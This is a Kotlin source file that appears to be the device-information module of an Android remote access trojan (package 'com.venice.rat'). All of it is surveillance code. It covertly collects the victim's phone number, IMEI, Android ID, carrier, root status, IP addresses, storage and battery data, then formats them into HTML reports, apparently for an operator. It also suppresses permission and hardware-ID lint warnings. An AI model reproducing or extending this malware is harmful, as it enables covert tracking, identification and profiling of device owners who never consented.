package com.venice.rat.mod

import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.net.ConnectivityManager
import android.os.BatteryManager
import android.os.Build
import android.os.Environment
import android.os.StatFs
import android.provider.Settings
import android.telephony.TelephonyManager
import com.venice.rat.core.Shell
import com.venice.rat.core.U
import java.net.NetworkInterface

object Info {

    @SuppressLint("HardwareIds", "MissingPermission")
    fun device(ctx: Context): String {
        val sb = StringBuilder()
        sb.appendLine("<b>DEVICE</b>")
        sb.appendLine("Model: ${Build.MANUFACTURER} ${Build.MODEL}")
        sb.appendLine("Android: ${Build.VERSION.RELEASE} (SDK ${Build.VERSION.SDK_INT})")
        sb.appendLine("Build: ${Build.ID}")
        sb.appendLine("ABI: ${Build.SUPPORTED_ABIS.joinToString()}")
        sb.appendLine("Uptime: ${android.text.format.DateUtils.formatElapsedTime(android.os.SystemClock.elapsedRealtime() / 1000)}")
        sb.appendLine()
        sb.appendLine("<b>IDENTITY</b>")
        sb.appendLine("AndroidID: ${Settings.Secure.getString(ctx.contentResolver, Settings.Secure.ANDROID_ID)}")
        runCatching {
            val tm = ctx.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
            sb.appendLine("Number: ${tm.line1Number}")
            sb.appendLine("Operator: ${tm.networkOperatorName}")
            sb.appendLine("IMEI: ${if (Build.VERSION.SDK_INT >= 26) tm.imei else tm.deviceId}")
        }
        sb.appendLine("Root: ${Shell.isRoot()}")
        sb.appendLine("AllFiles: ${U.isAllFiles(ctx)}")
        sb.appendLine()
        sb.appendLine("<b>NETWORK</b>")
        sb.appendLine(U.esc(ipInfo(ctx)))
        sb.appendLine()
        sb.appendLine("<b>STORAGE</b>")
        sb.appendLine(storage())
        return sb.toString()
    }

    @SuppressLint("MissingPermission")
    fun ipInfo(ctx: Context): String {
        val sb = StringBuilder()
        runCatching {
            NetworkInterface.getNetworkInterfaces().toList().filter { it.isUp && !it.isLoopback }.forEach { n ->
                n.inetAddresses.toList().forEach { a ->
                    if (!a.isLoopbackAddress) sb.appendLine("${n.name}: ${a.hostAddress}")
                }
            }
        }
        runCatching {
            val cm = ctx.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val n = cm.activeNetworkInfo
            sb.appendLine("Type: ${n?.typeName}")
        }
        return sb.toString().ifBlank { "no iface" }
    }

    fun storage(): String {
        val sb = StringBuilder()
        runCatching {
            val st = StatFs(Environment.getExternalStorageDirectory().path)
            sb.appendLine("External: ${U.size(st.availableBytes)} free / ${U.size(st.totalBytes)}")
        }
        runCatching {
            val st = StatFs(Environment.getDataDirectory().path)
            sb.appendLine("Internal: ${U.size(st.availableBytes)} free / ${U.size(st.totalBytes)}")
        }
        return sb.toString()
    }

    fun battery(ctx: Context): String {
        val i = ctx.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        val lvl = i?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
        val sc = i?.getIntExtra(BatteryManager.EXTRA_SCALE, 100) ?: 100
        val st = i?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1
        val tmp = (i?.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, 0) ?: 0) / 10.0
        val s = when (st) {
            BatteryManager.BATTERY_STATUS_CHARGING -> "Charging"
            BatteryManager.BATTERY_STATUS_FULL -> "Full"
            BatteryManager.BATTERY_STATUS_DISCHARGING -> "Discharging"
            else -> "Unknown"
        }
        return "Level: ${lvl * 100 / sc}%\nStatus: $s\nTemp: $tmp C"
    }

    fun netstat(ctx: Context): String {
        val sb = StringBuilder()
        runCatching {
            val cm = ctx.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            cm.allNetworks.forEach { n ->
                val ni = cm.getNetworkInfo(n)
                sb.appendLine("${ni?.typeName}: ${ni?.state}")
            }
        }
        return sb.toString().ifBlank { "n/a" }
    }
}
